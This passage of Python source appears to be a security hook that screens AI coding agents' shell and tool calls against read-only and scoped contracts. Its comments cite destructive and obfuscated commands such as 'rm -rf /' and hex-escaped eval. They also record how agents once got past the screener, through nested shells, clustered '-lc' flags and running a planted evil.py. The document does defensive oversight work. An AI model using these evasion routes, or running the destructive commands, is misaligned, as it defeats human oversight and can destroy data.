    return None


def _readonly_lex_segments(command: str):
    """Lex the deliberately small shell subset admitted for read-only work.

    Each word retains whether its spelling used quotes or escapes.  ``shlex``
    intentionally erases that fact, but it changes shell grammar: bare ``if``
    is syntax while ``'if'`` and ``\\if`` are executable names.  Returning a
    structural error is safer than trying to emulate the full shell parser.
    """
    segments: list[list[tuple[str, bool]]] = []
    segment: list[tuple[str, bool]] = []
    word: list[str] = []
    word_started = False
    decorated = False
    quote = None
    i = 0

    def finish_word():
        nonlocal word, word_started, decorated
        if word_started:
            segment.append(("".join(word), decorated))
        word = []
        word_started = False
        decorated = False

    def finish_segment():
        finish_word()
        if segment:
            segments.append(list(segment))
            segment.clear()

    text = str(command or "")
    while i < len(text):
        ch = text[i]
        if quote == "'":
            word_started = True
            decorated = True
            if ch == "'":
                quote = None
            else:
                word.append(ch)
            i += 1
            continue
        if quote == '"':
            word_started = True
            decorated = True
            if ch == '"':
                quote = None
                i += 1
                continue
            if ch == "`":
                return [], ("legacy backtick command substitution is outside "
                            "the admitted read-only grammar")
            if ch == "$":
                label = ("command/arithmetic substitution"
                         if i + 1 < len(text) and text[i + 1] == "("
                         else "shell variable expansion")
                return [], f"{label} is outside the admitted read-only grammar"
            if ch == "\\":
                decorated = True
                if i + 1 >= len(text):
                    return [], "trailing shell escape cannot be screened"
                word.append(text[i + 1])
                i += 2
                continue
            word.append(ch)
            i += 1
            continue

        if ch in "'\"":
            quote = ch
            word_started = True
            decorated = True
            i += 1
            continue
        if ch == "\\":
            decorated = True
            word_started = True
            if i + 1 >= len(text):
                return [], "trailing shell escape cannot be screened"
            word.append(text[i + 1])
            i += 2
            continue
        if ch == "`":
            return [], ("legacy backtick command substitution is outside the "
                        "admitted read-only grammar")
        if ch == "$":
            label = ("command/arithmetic substitution" if i + 1 < len(text)
                     and text[i + 1] == "(" else "shell variable expansion")
            return [], f"{label} is outside the admitted read-only grammar"
        if ch in "<>":
            label = ("process substitution" if i + 1 < len(text)
                     and text[i + 1] == "(" else "shell redirection/heredoc")
            return [], f"{label} is outside the admitted read-only grammar"
        if ch in "*?[]~":
            return [], ("unquoted glob/tilde expansion is outside the "
                        "admitted read-only grammar")
        if ch in "(){}":
            return [], ("shell grouping/compound syntax is outside the "
                        "admitted read-only grammar")
        if ch in " \t\r":
            finish_word()
            i += 1
            continue
        if ch == "\n":
            finish_segment()
            i += 1
            continue
        if ch in ";|&":
            finish_segment()
            if ch == "&" and not (i + 1 < len(text)
                                  and text[i + 1] == "&"):
                return [], ("background execution is outside the admitted "
                            "read-only grammar")
            if i + 1 < len(text) and text[i + 1] == ch:
                i += 2
            else:
                i += 1
            continue
        word_started = True
        word.append(ch)
        i += 1

    if quote is not None:
        return [], "unclosed shell quote cannot be screened"
    finish_segment()
    return segments, None


_TP_READONLY_TOP_LEVEL = frozenset({
    "--help", "--version", "help", "version", "status", "contracts",
    "summary", "dashboard", "findings",
})
_TP_READONLY_NESTED = frozenset({
    ("decision", "list"), ("decision", "show"),
    ("graph", "impact"),
    ("kb", "list"), ("kb", "lint"), ("kb", "retrieve"),
    ("kb", "where"),
    ("lens", "list"), ("lens", "show"),
    ("loop", "status"),
    ("req", "list"),
    ("repository", "status"),
    ("share", "status"),
    ("target", "show"), ("target", "tools"),
})


def _tp_readonly_argv_violation(args) -> "str | None":
    """Refuse trusted Taskplane CLI verbs that can mutate governance state."""
    dangerous_flags = {
        "--all", "--approved-by", "--by", "--grant", "--install",
        "--install-codex-hooks", "--out", "--response", "--write",
        "--workspace",
    }
    if any(arg in dangerous_flags
           or any(arg.startswith(flag + "=") for flag in dangerous_flags)
           for arg in args):
        return "canonical Taskplane CLI argv includes a mutating/output flag"
    positional = [arg for arg in args if not arg.startswith("-")]
    if not positional:
        if args and args[0] in {"--help", "--version"}:
            return None
        return "canonical Taskplane CLI is missing a read-only verb"
    if positional[0] in _TP_READONLY_TOP_LEVEL:
        return None
    if len(positional) > 1 and tuple(positional[:2]) in _TP_READONLY_NESTED:
        return None
    return (
        f"canonical Taskplane CLI verb `{' '.join(positional[:2])}` is not "
        "on the read-only verb allowlist")


def _readonly_argv_violation(program: str, args) -> "str | None":
    """Reject write/exec-capable argv forms of otherwise familiar tools."""
    if program == "git":
        return _git_readonly_violation(args)
    if (program in _WRITE_PROGRAMS or program in _INTERPRETERS
            or _python_program(program) or program in _SHELLS
            or program in _WRAPPERS or program in _ARCHIVE_EXTRACTORS
            or program in {"eval", "find", "patch", "xargs"}):
        return f"`{program}` is not admitted by the direct read-only argv grammar"
    if program not in _READONLY_SAFE_PROGRAMS - {"tp"}:
        return f"`{program}` has no admitted read-only argv schema"

    # These tools have useful, unambiguous positional read forms.  Options are
    # refused rather than inheriting each utility's much larger grammar (for
    # example xxd -r, diff --output, file --compile, or a future extension).
    positional_only = frozenset({
        "basename", "cat", "cmp", "comm", "cut", "diff", "dirname", "du",
        "file", "head", "jq", "ls", "md5", "md5sum", "od", "readlink",
        "realpath", "sha256sum", "shasum", "stat", "strings", "tail", "tr",
        "uniq", "wc", "whereis", "which", "xxd", "zipinfo",
    })
    if program in positional_only:
        option_mode = True
        for arg in args:
            if option_mode and arg == "--":
                option_mode = False
                continue
            if option_mode and arg.startswith("-") and arg != "-":
                return (
                    f"`{program}` option `{arg}` is outside its exact "
                    "positional-only read-only argv schema")
        return None

    if program == "rg":
        safe_flags = frozenset({
            "-a", "--text", "-F", "--fixed-strings", "-i", "--ignore-case",
            "-l", "--files-with-matches", "--files-without-match", "-n",
            "--line-number", "--no-line-number", "--no-heading", "--heading",
            "-o", "--only-matching", "-q", "--quiet", "-s",
            "--case-sensitive", "-S", "--smart-case", "-U", "--multiline",
            "--multiline-dotall", "-v", "--invert-match", "-w",
            "--word-regexp", "-x", "--line-regexp", "--count",
            "--count-matches", "--crlf", "--files", "--hidden", "--json",
            "--no-ignore", "--no-ignore-vcs", "--no-messages", "--pcre2",
            "--stats",
        })
        value_flags = frozenset({
            "-A", "--after-context", "-B", "--before-context", "-C",
            "--context", "--color", "--colors", "-e", "--regexp",
            "--encoding", "-f", "--file", "-g", "--glob", "-m",
            "--max-count", "--max-depth", "--path-separator", "-r",
            "--replace", "--sort", "--sortr", "-t", "--type", "-T",
            "--type-not",
        })
        glued_short = re.compile(r"^-(?:[ABCfgemrtT]).+$")
        i = 0
        while i < len(args):
            arg = args[i]
            if arg == "--":
                return None
            if not arg.startswith("-") or arg == "-":
                i += 1
                continue
            if arg in safe_flags or glued_short.match(arg):
                i += 1
                continue
            if arg in value_flags:
                if i + 1 >= len(args):
                    return f"`rg` option `{arg}` is missing its value"
                i += 2
                continue
            if any(arg.startswith(flag + "=")
                   for flag in value_flags if flag.startswith("--")):
                i += 1
                continue
            return f"`rg` option `{arg}` is outside its exact read-only argv schema"
        return None

    # Shell-built read primitives have no external helper or filesystem-write
    # mode once expansion and redirection have already been excluded.
    if program in _READONLY_SHELL_BUILTINS | {"expr", "printf"}:
        return None
    # Date can set the system clock on supported hosts; omit it rather than
    # attempting to reconcile GNU/BSD flag grammars.
    if program == "date":
        return "`date` is omitted because some host argv forms set system time"
    return f"`{program}` has no exact admitted read-only argv schema"


def _readonly_command_grammar_violation(command: str,
                                        workspace: str | None,
                                        write_allow) -> "str | None":
    """Validate the complete executable grammar before semantic screening.

    Read-only shell access admits direct simple commands separated by ``;``,
    newlines, ``&&``, ``||``, or pipelines.  It deliberately refuses shell
    keywords/groups, wrappers, shells, eval, xargs, and substitutions.  Every
    admitted command token is bare, unquoted/unescaped, and bound to the same
    executable identity observed on the hook's startup PATH.  The sole
    path-qualified exception is this package's exact canonical ``tp.py``.
    """
    segments, error = _readonly_lex_segments(command)
    if error:
        return error
    if not segments and str(command or "").strip():
        return "shell command contains no directly screenable executable"

    complex_launchers = (_WRAPPERS | _SHELLS | {"eval", "xargs"})
    for words in segments:
        raw_program, decorated = words[0]
        args = [value for value, _ in words[1:]]
        if decorated:
            return (
                f"executable token `{raw_program}` is quoted or escaped; "
                "read-only executables must be bare lexical tokens")
        if (raw_program in _SHELL_KEYWORDS
                or raw_program in {"{", "}", "[[", "]]"}):
            return (
                f"shell keyword `{raw_program}` is outside the admitted "
                "read-only grammar")
        if re.match(r"^[A-Za-z_][A-Za-z_0-9]*=", raw_program):
            return (
                "execution environment assignment is outside the admitted "
                "read-only grammar")

        normalized = raw_program.replace("\\", "/")
        if "/" in normalized:
            if _is_tp_cli(raw_program, workspace):
                return _tp_readonly_argv_violation(args)
            return (
                f"path-qualified executable `{raw_program}` cannot be "
                "accepted as a trusted read-only program")

        program = os.path.basename(raw_program)
        if program in complex_launchers:
            return (
                f"`{program}` is outside the admitted direct-command "
                "read-only grammar")
        identity_violation = _readonly_executable_identity_violation(
            raw_program, workspace, write_allow)
        if identity_violation:
            return identity_violation
        argv_violation = _readonly_argv_violation(program, args)
        if argv_violation:
            return argv_violation
    return None


def _analyze(command: str, _depth: int = 0,
             workspace: "str | None" = None):
    """Screen a shell command string.

    Returns (targets, opaque) where `targets` is the list of concrete write
    paths (redirects + write-program args, seen through wrappers and nested
    `sh -c`/`$()`), and `opaque` is None or a `(kind, reason)` tuple naming a
    mutation whose path can't be resolved statically:
      kind='destructive' — `find -delete/-exec`, `git checkout/reset/…`,
        `xargs <mutator>`: unscopeable AND clearly file-mutating; blocked
        under any governing contract.
      kind='interpreter' — `python -c`/`perl -e`/…: a Turing-complete body
        that can write anywhere; blocked under read-only contracts, allowed
        (documented gap) under build contracts.
      kind='launcher' — an executable outside the narrow read-only argv
        allowlist; blocked under read-only contracts because it may execute
        repository-defined code, allowed under build contracts.
    """
    targets: list = []
    opaque = None
    # Whether EVERY `python -c` body in this command is provably read-only.
    # Computed on the WHOLE command with a quote-aware split, before the
    # separator split below — which is a regex and happily cuts a body in
    # half at a `;` inside quotes, leaving the interpreter branch with an
    # unparseable fragment. Redirects are still screened per-part, so a
    # read-only body with `> out.txt` after it is still caught by the target
    # scan.
    ro_inline = _inline_bodies_all_readonly(command) if _depth == 0 else False
    if _depth > 6:
        # D-0004: this used to return ([], None), which every caller reads
        # as "no mutation found" — so seven levels of nested `sh -c` passed
        # under a read-only contract. Its twin in _deny_segments already
        # failed CLOSED at the same depth. Mirror it: unresolvable nesting
        # is a destructive opaque, not an absence of evidence.
        return targets, ("destructive",
                         "command nesting exceeds the screener's depth "
                         "limit; its effects cannot be resolved from argv")

    # `N>|`/`>|` (force-clobber redirect) is semantically `>`; normalize it
    # BEFORE the separator split below eats the `|`, or `2>| /etc/f` splits
    # into an innocuous "2>" part and a bare-path part and the target is
    # never seen. Then decode bash ANSI-C quoting ($'…'): shlex doesn't know
    # it, so `eval $'rm \\x2drf x'` would otherwise tokenize into gibberish
    # that hides the real command.
    command = _ansi_c_unquote(command.replace(">|", ">"))

    substitutions, substitution_error = _shell_substitution_bodies(command)
    if substitution_error:
        opaque = opaque or (
            "launcher",
            f"shell substitution structure can't be screened: "
            f"{substitution_error}")
    for _, body in substitutions:
        if body.strip():
            t, o = _analyze(body, _depth + 1, workspace)
            targets += t
            opaque = opaque or o

    for part in _CMD_SEP_RE.split(command):
        toks = _shsplit(part)
        if not toks:
            continue
        targets += _redirect_targets(toks)
        assignments: list[str] = []
        wrapper_programs: list[str] = []
        toks = _unwrap(_strip_keywords(toks), assignments, wrapper_programs)
        if assignments:
            names = [item.split("=", 1)[0] for item in assignments]
            opaque = opaque or (
                "launcher",
                "execution environment assignment(s) "
                f"{', '.join(f'`{name}`' for name in names)} can select "
                "Git/process tracing, loaders, interpreters, pagers, "
                "editors, or "
                "external helpers that can't be screened from argv")
        for wrapper_program in wrapper_programs:
            identity_violation = _readonly_executable_identity_violation(
                wrapper_program, workspace)
            if identity_violation:
                opaque = opaque or ("launcher", identity_violation)
        if not toks:
            continue
        raw_prog = toks[0]
        prog = os.path.basename(raw_prog)
        args = toks[1:]

        identity_sensitive = (
            prog in _READONLY_SAFE_PROGRAMS
            or prog in _SHELLS
            or prog in _INTERPRETERS
            or prog in _ARCHIVE_EXTRACTORS
            or prog in {"find", "git"}
            or _python_program(prog))
        if identity_sensitive:
            identity_violation = _readonly_executable_identity_violation(
                raw_prog, workspace)
            if identity_violation:
                opaque = opaque or ("launcher", identity_violation)

        if prog in _SHELLS:
            # -c may hide in a short-option cluster (`bash -lc '…'`) — the
            # old exact `== "-c"` test let a clustered form skip the body
            # analysis entirely, so `bash -lc 'echo x > src/main.py'`
            # slipped past even a READ-ONLY contract (v2.3.0).
            saw_c = any(a == "-c" or (a.startswith("-")
                                      and not a.startswith("--")
                                      and "c" in a[1:])
                        for a in args)
            body = _shell_c_body(args) if saw_c else None
            if body is not None:
                t, o = _analyze(body, _depth + 1, workspace)
                targets += t
                opaque = opaque or o
            else:
                # `sh script.sh` / stdin-driven shell: the commands it runs
                # are as un-screenable as `python file.py` — surface it as
                # interpreter-opaque so a read-only contract blocks it
                # (build contracts keep the documented interpreter gap).
                opaque = opaque or (
                    "interpreter",
                    f"`{prog} <script|stdin>` runs commands that can't be "
                    "screened from argv")
            continue
        if prog == "eval":
            # eval re-parses its args as a shell command — screen what it
            # RUNS. Combined with the ANSI-C decode above this closes
            # `eval $'rm \x2drf x'`. An eval body we can't see through
            # (e.g. `eval "$CMD"`) still isn't provably safe — but eval of
            # a variable is rare in agent traffic and the screen stays a
            # cooperative best-effort layer, not an OS boundary.
            t, o = _analyze(" ".join(args), _depth + 1, workspace)
            targets += t
            opaque = opaque or o
            continue
        if prog == "xargs":
            sub = args
            while sub and sub[0].startswith("-"):
                sub = sub[1:]
            sub = _unwrap(sub)
            subprog = os.path.basename(sub[0]) if sub else ""
            if (subprog in _WRITE_PROGRAMS or subprog in _INTERPRETERS or
                    _python_program(subprog) or subprog in _SHELLS or subprog == "find"):
                opaque = opaque or (
                    "destructive",
                    f"`xargs {subprog} …` runs a mutator on stdin-supplied "
                    "paths that can't be screened")
            else:
                opaque = opaque or (
                    "launcher",
                    "`xargs` launches stdin-selected commands whose file "
                    "writes can't be screened from argv")
            continue
        fn = _WRITE_PROGRAMS.get(prog)
        if fn:
            targets += fn(args)
            continue
        if prog == "patch":
            # `patch` applies a diff — the files it rewrites are named INSIDE
            # the diff, not in argv, so the target can't be resolved
            # statically. Clearly file-mutating and unscopeable: block it under
            # any governing/read-only contract, like find -delete / git apply.
            opaque = opaque or (
                "destructive",
                "`patch` applies a diff to files named in the patch body, "
                "at no statically-known path")
            continue
        if prog == "find":
            act = next((a for a in args
                        if a in ("-delete", "-exec", "-execdir",
                                 "-ok", "-okdir")), None)
            if act:
                opaque = opaque or (
                    "destructive",
                    f"`find … {act} …` mutates matched files at no "
                    "statically-known path")
            continue
        if prog in _ARCHIVE_EXTRACTORS:
            # unzip extracts by default; tar extracts only with an x-mode.
            extract = (prog == "unzip"
                       and not any(a in ("-l", "-t", "-v", "-p") for a in args)
                       ) or (prog == "tar" and _tar_extracts(args))
            if extract:
                opaque = opaque or (
                    "destructive",
                    f"`{prog}` extracts files to paths named inside the "
                    "archive, unscopeable from argv")
            continue
        if prog in _INTERPRETERS or _python_program(prog):
            # This package's own CLI is the governed tool, not an arbitrary
            # body — exempt it so a read-only review can still run tp.py.
            first_arg = next((a for a in args if not a.startswith("-")), None)
            if _python_program(prog) and first_arg \
                    and _is_tp_cli(first_arg, workspace):
                continue
            if any(a in ("-c", "-e", "-E") or a.startswith("-e")
                   for a in args):
                # v2.11.0: a python -c body is a GRAMMAR, not an opaque
                # blob. If every construct in it appears on the read-only
                # allowlist, it is screenable and allowed; anything else
                # (including code that will not parse) keeps the denial.
                if not (_python_program(prog) and ro_inline):
                    opaque = opaque or (
                        "interpreter",
                        f"`{prog} -c/-e …` runs inline code whose file writes "
                        "can't be screened from argv (a body that only READS "
                        "— stdlib reads, no writers, no dunders — is allowed)")
            elif not args or not all(a in _INTERPRETER_SAFE_FLAGS
                                     for a in args):
                # v2.3.0 tightening: a script FILE (`python3 file.py`), a
                # module (`python3 -m mod`), or a bare/stdin invocation is
                # exactly as un-screenable as `-c` — the body can write
                # anywhere. Surfaced as interpreter-opaque so a READ-ONLY
                # contract blocks it (this closed a live bypass: write
                # evil.py into write_allow, then `python3 evil.py` rewrote
                # the reviewed source). Build contracts keep the documented
                # interpreter gap (screen_command only blocks 'destructive').
                opaque = opaque or (
                    "interpreter",
                    f"`{prog} <script|module|stdin>` runs code whose file "
                    "writes can't be screened from argv")
            continue
        if prog == "git":
            # Preserve the governed-build mutator denial, then apply the
            # stricter read-only allowlist. A launcher opaque is ignored by
            # build contracts but refused by the read-only branch above.
            sub, _ = _git_subcommand(args)
            if sub in _GIT_MUTATORS:
                opaque = opaque or (
                    "destructive",
                    f"`git {sub}` rewrites tracked files in the working tree")
            else:
                violation = _git_readonly_violation(args)
                if violation:
                    opaque = opaque or ("launcher", violation)
            continue
        if _is_tp_cli(raw_prog, workspace):
            continue
        if prog not in _READONLY_SAFE_PROGRAMS:
            opaque = opaque or (
                "launcher",
                f"`{prog}` may launch repository-defined code whose file "
                "writes can't be screened from argv")

    return [t for t in targets if t], opaque


def write_targets(command: str) -> list:
    """Concrete write paths in a shell command (redirects + write-program
    args), seen through wrappers and nested `sh -c`/`$()`. Unscopeable
    mutators (interpreters, `find -delete`, VCS reverts) are surfaced
    separately via `_analyze`, not here."""
    return _analyze(command)[0]


def _deny_tok_eq(tok: str, pat: str) -> bool:
    """Token equality for deny matching, with one normalization: any all-slash
    token equals any all-slash pattern token, so `rm -rf //` still matches the
    `rm -rf /` deny (POSIX treats // as the root too)."""
    if tok == pat:
        return True
    return bool(tok and pat and set(tok) <= {"/"} and set(pat) <= {"/"})


def _seg_matches_deny(toks, pat) -> bool:
    """Does ONE simple command (unwrapped argv) match a deny pattern?

    Anchored subsequence (v2.3.0 precision fix): the pattern's FIRST token
    must be the invoked program (or its basename — `/usr/bin/git push` is
    still `git push`), and the remaining pattern tokens must appear in order
    among that program's OWN arguments. So `git push`, `git -C sub push`,
    and `git --no-pager push` are denied, while `git commit -m ok && echo
    push` (separate segments) and `grep "git push" file` (pattern only in a
    data argument) are not — the old whole-line subsequence + raw substring
    matched all of them and burned budgets on false denies."""
    if not pat or not toks:
        return False
    head = toks[0]
    if not (_deny_tok_eq(head, pat[0])
            or _deny_tok_eq(os.path.basename(head), pat[0])):
        return False
    i, rest = 0, toks[1:]
    for p in pat[1:]:
        while i < len(rest) and not _deny_tok_eq(rest[i], p):
            i += 1
        if i >= len(rest):
            return False
        i += 1
    return True


def _deny_segments(command: str, _depth: int = 0):
    """(segments, unscreenable): the unwrapped argv of every simple command
    the shell would run — through wrappers, `sh -c` bodies (including
    clustered short options like `bash -lc`), `eval`, `$()`/backticks and
    ANSI-C quoting — plus a flag set when the command contains an executor
    whose body can't be resolved statically (a stdin/script-file shell, an
    interpreter, xargs, eval). For those, deny patterns ALSO match as raw
    text: `echo "git push" | sh` must stay blocked (ambiguity stays denied),
    while plain `echo "never git push"` — no executor — is allowed."""
    segs: list = []
    unscreen = False
    if _depth > 6:
        return segs, True          # runaway nesting: treat as unscreenable
    command = _ansi_c_unquote(command.replace(">|", ">"))
    substitutions, substitution_error = _shell_substitution_bodies(command)
    unscreen = bool(substitution_error)
    for _, body in substitutions:
        if body.strip():
            s, u = _deny_segments(body, _depth + 1)
            segs += s
            unscreen = unscreen or u
    for part in _CMD_SEP_RE.split(command):
        toks = _unwrap(_strip_keywords(_shsplit(part)))
        if not toks:
            continue
        segs.append(toks)
        prog = os.path.basename(toks[0])
        args = toks[1:]
        if prog in _SHELLS:
            # -c may hide in a short-option cluster (`bash -lc '…'`)
            saw_c = any(a == "-c" or (a.startswith("-")
                                      and not a.startswith("--")
                                      and "c" in a[1:])
                        for a in args)
            body = _shell_c_body(args) if saw_c else None
            if body:
                s, u = _deny_segments(body, _depth + 1)
                segs += s
                unscreen = unscreen or u
            else:
                unscreen = True    # stdin-driven or script-file shell
        elif prog == "eval":
            s, u = _deny_segments(" ".join(args), _depth + 1)
            segs += s
            unscreen = unscreen or u
        elif prog in _INTERPRETERS or _python_program(prog) or prog == "xargs":
            unscreen = True
    return segs, unscreen


def deny_violation(cmd: str, deny) -> str | None:
    """First deny pattern the command matches, or None. See _seg_matches_deny
    / _deny_segments for the matching rules (v2.3.0)."""
    if not deny:
        return None
    segs, unscreen = _deny_segments(cmd)
    joined = " ".join(_shsplit(cmd))
    for pattern in deny:
        pat = (pattern or "").split()
        if not pat:
            continue
        if any(_seg_matches_deny(toks, pat) for toks in segs):
            return pattern
        # Un-screenable executor present: fall back to the strict raw-text
        # match so pattern text smuggled through a shell/interpreter body
        # stays BLOCKED. Without an executor the raw match is dropped —
        # that's the whole precision gain.
        if unscreen and pattern in joined:
            return pattern
    return None


def screen_command(cmd: str, coding: dict, workspace: str | None) -> str | None:
    pattern = deny_violation(cmd, (coding.get("command_policy")
                                   or {}).get("deny") or [])
    if pattern:
        return f"command matches deny pattern '{pattern}'"
    targets, opaque = _analyze(cmd, workspace=workspace)
    for target in targets:
        p = norm(target, workspace)
        if p:
            v = scope_violation(p, coding)
            if v:
                return v
    # An unscopeable-but-clearly-destructive verb (find -delete, git reset,
    # xargs rm) can't be proven in-scope, so a governed build contract blocks
    # it. Bare interpreters (`python -c`) stay allowed here — the documented
    # gap: a cooperative hook can't bound a Turing-complete body.
    governed = bool(coding.get("scope_paths")
                    or coding.get("out_of_scope_paths"))
    if opaque and opaque[0] == "destructive" and governed:
        return f"unscopeable mutation blocked: {opaque[1]}"
    return None


_HOST_HOOK_COMMANDS = frozenset({
    "screen", "screen-skill", "screen-dispatch", "screen-render",
    "subagent-start",
    "subagent-stop", "session-verify", "context",
})


def host_hook_cli_invocation(command: str,
                             workspace: str | None = None) -> "str | None":
    """Return a hook-only tp.py subcommand invoked through an agent shell.

    Host hooks execute these entry points directly. Letting a governed agent
    invoke the same public command through Bash turns lifecycle/provenance
    events into self-assertions, so the shell path is always refused.
    """
    segments, _ = _deny_segments(command)
    for tokens in segments:
        for index, token in enumerate(tokens):
            if not _is_tp_cli(token, workspace):
                continue
            command_args = [item for item in tokens[index + 1:]
                            if not item.startswith("-")]
            if command_args and command_args[0] in _HOST_HOOK_COMMANDS:
                return command_args[0]
    return None


# --------------------------------------------------------------- screen

def tool_aliases(tool_name: str) -> tuple[str, ...]:
    """Names a host may use for the same capability.

    Codex reports the canonical ``apply_patch`` and ``Agent`` names in hook
    events even when hook matchers used the compatibility aliases Edit/Write
    and Task. Contracts written for Claude therefore remain valid without
    weakening their allowlists.
    """
    return TOOL_ALIASES.get(tool_name, (tool_name,))


def command_text(tool_name: str, tool_input: dict) -> str:
    """One command payload for Claude Bash and Codex exec_command.

    Codex names the capability ``exec_command`` and puts the shell text in
    ``cmd``. Treating only Claude's ``Bash``/``command`` shape as a command
    silently bypasses screening and makes the derivation ledger grade a real
    ReviewKernel run as if it never derived its diff or impact.
    """
    if tool_name in {"exec_command", "functions.exec_command"}:
        return str(tool_input.get("cmd") or "")
    return str(tool_input.get("command") or "")


def write_paths(tool_name: str, tool_input: dict) -> list[str]:
    """Return every filesystem target named by a host write tool."""
    if tool_name == "apply_patch":
        body = str(tool_input.get("command", ""))
        return [m.group("path").strip() for m in _PATCH_TARGET_RE.finditer(body)]
    fields = WRITE_TOOL_PATH_FIELDS.get(tool_name, ())
    raw = next((tool_input[f] for f in fields if tool_input.get(f)), "")
    return [str(raw)] if raw else []

def screen_tool(contract: dict, tool_name: str, tool_input: dict,
                workspace: str | None) -> tuple[bool, str]:
    """Return (allow, reason). Mirrors the taskplane PreToolUse hook."""
    members = contract.get("_union")
    if members and contract.get("_sibling_root") and \
            tool_name in WRITE_TOOLS:
        # SIBLING WAVE, write path only: screen against the union's MERGED
        # write_allow rather than asking every member (which would deny each
        # sibling's own directory). Every other dimension still recurses
        # below, so read_only, scope, denies and tools are unchanged.
        flat = {k: v for k, v in contract.items() if k != "_union"}
        return screen_tool(flat, tool_name, tool_input, workspace)
    if members:
        # Most-restrictive union (v2.3.0): the action passes only if EVERY
        # active contract approves it. First refusal wins — ambiguity between
        # parallel contracts always resolves to BLOCK, never to the loosest.
        for m in members:
            ok, reason = screen_tool(m, tool_name, tool_input, workspace)
            if not ok:
                return False, (f"[{m.get('task_id', '?')}] {reason} "
                               f"(most-restrictive union of {len(members)} "
                               "active contracts; set TASKPLANE_TASK to work "
                               "under a single task's contract)")
        return True, f"within every active contract ({len(members)}-way union)"
    if contract.get("read_only"):
        if tool_name in COMMAND_TOOLS:
            return False, (
                "read-only review contract: every shell command tool is "
                "blocked because this host hook cannot prove shell=False, a "
                "sanitized process environment, or executable bytes; use "
                "explicitly allowed host-native Read/Grep/Glob and scoped "
                "Write/Edit tools")
        native_tools = READONLY_NATIVE_READ_TOOLS | WRITE_TOOLS
        if tool_name not in native_tools:
            return False, (
                f"read-only review contract: '{tool_name}' is not an exact "
                "host-native Read/Grep/Glob or scoped Write/Edit tool")
        if not contract.get("allowed_tools"):
            return False, (
                "read-only review contract has no explicit allowed_tools; "
                "implicit tool admission is forbidden")
    allowed = contract.get("allowed_tools") or []
    if allowed and not any(name in allowed for name in tool_aliases(tool_name)):
        return False, f"tool '{tool_name}' not in allowed_tools"

    if tool_name in COMMAND_TOOLS:
        hook_command = host_hook_cli_invocation(
            command_text(tool_name, tool_input), workspace)
        if hook_command:
            return False, ("host hook entry point cannot be invoked through "
                           f"an agent shell: {hook_command}")
    coding = contract.get("coding") or {}

    # Read-only contract: no filesystem writes EXCEPT an optional allowlist
    # of artifact dirs (write_allow). Used by reviewer/planner roles — e.g.
    # the EM may write review artifacts + scratch under .em-review/** but
    # never touch the reviewed source. Enforces the cardinal rule mechanically.
    if contract.get("read_only"):
        allow = contract.get("write_allow") or []
        if tool_name in WRITE_TOOLS:
            paths = write_paths(tool_name, tool_input)
            if not paths:
                return False, (f"read-only review contract: '{tool_name}' "
                               "did not expose a screenable write target")
            bad = next((raw for raw in paths
                        if not writable_target(raw, allow, workspace)),
                       None)
            if bad is not None:
                return False, (f"read-only review contract: '{tool_name}' may "
                               f"only write under {allow or '(nothing)'} — "
                               f"'{bad}' is outside it; the reviewed source "
                               "is protected")
        # deny patterns still apply below

    if tool_name in WRITE_TOOLS and (coding.get("scope_paths")
                                     or coding.get("out_of_scope_paths")):
        paths = write_paths(tool_name, tool_input)
        if not paths:
            return False, (f"'{tool_name}' did not expose a screenable write "
                           "target")
        for raw in paths:
            p = norm(raw, workspace)
            if contract.get("read_only") and p.startswith("ESCAPES:") and \
                    writable_target(raw, contract.get("write_allow") or [],
                                    workspace):
                # The read-only branch already proved this is a canonical
                # managed-run artifact. Build-scope rules describe source
                # paths inside the checkout and must not reclassify that
                # deliberately external artifact as an escape.
                continue
            v = scope_violation(p, coding)
            if v:
                return False, v

    if tool_name in COMMAND_TOOLS:
        v = screen_command(command_text(tool_name, tool_input), coding,
                           workspace)
        if v:
            return False, v

    return True, "within contract"


# --------------------------------------------------------------- DoD

# Safety ceilings are immutable protocol bounds, not configurable defaults.
DEFAULT_MAX_TEST_TIMEOUT_SECONDS = 3600
MAX_TEST_TIMEOUT_SECONDS = 14400


def _canonical_operational_settings(*, legacy_environment: bool = False,
                                    authority: dict | None = None):
    """Load one immutable settings snapshot without creating a local cache.

    The lite kernel is imported both as ``taskplane.taskplane_lite`` and as a
    direct sibling module by the CLI.  Keep the import lazy to preserve those
    two supported entry paths and to avoid turning settings into mutable
    process-global state.
    """
    try:
        from .settings import load_settings
    except (ImportError, ValueError):
        from settings import load_settings
    return load_settings(
        environment=os.environ if legacy_environment else None,
        authority=authority)


def validate_test_timeout_seconds(value, *, field: str,
                                  plan_minted: bool = False) -> int:
    """Return one strict, bounded suite timeout or fail deterministically."""
    maximum = (MAX_TEST_TIMEOUT_SECONDS if plan_minted
               else DEFAULT_MAX_TEST_TIMEOUT_SECONDS)
    if isinstance(value, bool) or not isinstance(value, int):
        raise ValueError(
            f"{field} must be a real integer from 1 to "
            f"{maximum}")
    if value <= 0 or value > maximum:
        raise ValueError(
            f"{field} must be from 1 to {maximum}")
    return value


def task_test_timeout_seconds(task: dict) -> int:
    """Derive the approved aggregate test timeout from one plan task."""
    field = "verification_runner.gate_timeout.aggregate_seconds"
    if not isinstance(task, dict):
        raise ValueError(f"{field} task container must be an object")
    if "verification_runner" not in task:
        return int(_canonical_operational_settings().limits.timeouts[
            "task_seconds"])
    runner = task.get("verification_runner")
    if not isinstance(runner, dict):
        raise ValueError(f"{field} parent containers must be objects")
    if "gate_timeout" not in runner:
        raise ValueError(f"{field} is required when verification_runner is present")
    gate_timeout = runner.get("gate_timeout")
    if not isinstance(gate_timeout, dict):
        raise ValueError(f"{field} parent containers must be objects")
    if "aggregate_seconds" not in gate_timeout:
        raise ValueError(f"{field} is required when gate_timeout is present")
    return validate_test_timeout_seconds(
        gate_timeout.get("aggregate_seconds"), field=field,
        plan_minted=True)


def _run(cmd, cwd, shell=False, timeout=600, env=None):
    # env=None inherits the parent environment (subprocess default) — every
    # pre-existing caller is unchanged; dod_check passes a sanitized copy
    # (A3, R-0007).
    return subprocess.run(cmd, cwd=cwd, shell=shell, capture_output=True,
                          text=True, timeout=timeout, env=env, encoding="utf-8", errors="replace")


_CHECKOUT_PYTHON_TRAMPOLINE = (
    "import os,sys;"
    "root=os.path.realpath(sys.argv[1]);"
    "sys.path.insert(0,os.path.realpath(sys.argv[2]));"
    "import taskplane_lite as _tp;"
    "_tp._checkout_bound_main(root,sys.argv[3:])")


def _python_program(value) -> bool:
    try:
        program = os.path.basename(os.fspath(value)).lower()
    except TypeError:
        return False
    return bool(re.fullmatch(
        r"python(?:\d+(?:\.\d+)?)?(?:\.exe)?", program))


def _checkout_bound_python_args(workspace: str, args) -> list:
